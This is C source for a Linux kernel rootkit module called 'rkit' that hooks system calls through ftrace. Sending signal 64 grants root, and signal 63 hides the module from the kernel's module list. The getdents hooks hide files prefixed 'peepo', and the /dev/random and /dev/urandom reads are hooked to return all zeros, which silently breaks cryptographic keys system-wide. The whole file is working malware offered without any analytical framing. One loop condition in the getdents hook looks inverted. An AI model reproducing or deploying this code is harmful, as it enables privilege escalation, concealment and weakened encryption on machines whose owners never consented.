#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

#include "ftrace_helper.h"

#define PREFIX "peepo"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Connection");
MODULE_DESCRIPTION("rkit");
MODULE_VERSION("0.01");

asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static short hidden = 0;
static struct list_head *prev_module;

void hideme(void) {
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void showme(void) {
	list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage int hook_kill(const struct pt_regs *regs) {
	void set_root(void);
	void showme(void);
	void hideme(void);

	int sig = regs->si;
	if (sig == 64) {
		printk(KERN_INFO "rkit: giving root\n");
		set_root();
	}
	else if ( ( sig == 63) && (hidden == 0) ) {
		printk(KERN_INFO "rkit: hiding rkit\n");
		hideme();
		hidden = 1;
	}
	else if ( ( sig == 63) && (hidden == 1) ) {
		printk(KERN_INFO "rkit: revealing rkit\n");
		showme();
		hidden = 0;
	}
	else {
		return orig_kill(regs);
	}
	return 0;
}

static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos) {
	int bytes_read, i;
	long error;
	char *kbuf = NULL;

	bytes_read = orig_random_read(file, buf, nbytes, ppos);
	kbuf = kzalloc(bytes_read, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytes_read);
	if (error) {
		printk(KERN_DEBUG "rkit: %ld bytes could not be copied into kbuf\n", error);
		kfree(kbuf);
		return bytes_read;
	}

	for ( i = 0; i < bytes_read; i++ ) 
		kbuf[i] = 0x00;
	error = copy_to_user(buf, kbuf, bytes_read);
	if(error)
		printk(KERN_DEBUG "rkit: %ld bytes could not be copied back into buf\n", error);

	kfree(kbuf);

	//printk(KERN_DEBUG "rkit: intercepted read to /dev/random: %d bytes.\n", bytes_read);


	return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos) {
	int bytes_read, i;
	long error;
	char *kbuf = NULL;

	bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
	printk(KERN_DEBUG "rkit: intercepted read to /dev/urandom: %d bytes.\n", bytes_read);

	kbuf = kzalloc(bytes_read, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytes_read);

	if(error) {
		printk(KERN_DEBUG "rkit: %ld bytes could not be copied into kbuf\n", error);
		kfree(kbuf);
		return bytes_read;
	}

	for (i = 0; i < bytes_read; i++)
		kbuf[i] = 0x00;

	error = copy_to_user(buf, kbuf, bytes_read);
	if (error)
		printk(KERN_DEBUG "rkit: %ld bytes could not be copied into buf\n", error);

	kfree(kbuf);

	return bytes_read;
}

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	
	long error;

	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	unsigned long offset = 0;

	int ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ( (ret <= 0 ) || ( dirent_ker == NULL ) )
		return ret;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	while (offset < ret) {
		current_dir = (void *)dirent_ker + offset;

		if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			if (current_dir == dirent_ker) {
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
		previous_dir->d_reclen += current_dir->d_reclen;
		}
		else {
			previous_dir = current_dir;		
		}
		offset += current_dir->d_reclen;

	}
	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;

done:
	kfree(dirent_ker);
	return ret;

}

asmlinkage int hook_getdents(const struct pt_regs *regs) {
	//not in headers so have to add manually
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};

	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

	long error;

	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
	unsigned long offset = 0;

	int ret = orig_getdents(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ( ( ret <= 0 ) || ( dirent_ker == NULL ) )
		return ret;
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	while (offset > ret) {
		current_dir = (void *)dirent_ker + offset;

		if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			if (current_dir == dirent_ker) {
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else {
			previous_dir = current_dir;
		}

		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if(error)
		goto done;

done:
	kfree(dirent_ker);
	return ret;
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("random_read", hook_random_read, &orig_random_read),
	HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

void set_root(void) {
	struct cred *root;
	root = prepare_creds();

	if(root == NULL)
		return;

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}

static int __init rkit_init(void) {
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	printk(KERN_INFO "rkit: loaded\n");
	return 0;
}

static void __exit rkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rkit: unloaded\n");
}

module_init(rkit_init);
module_exit(rkit_exit);

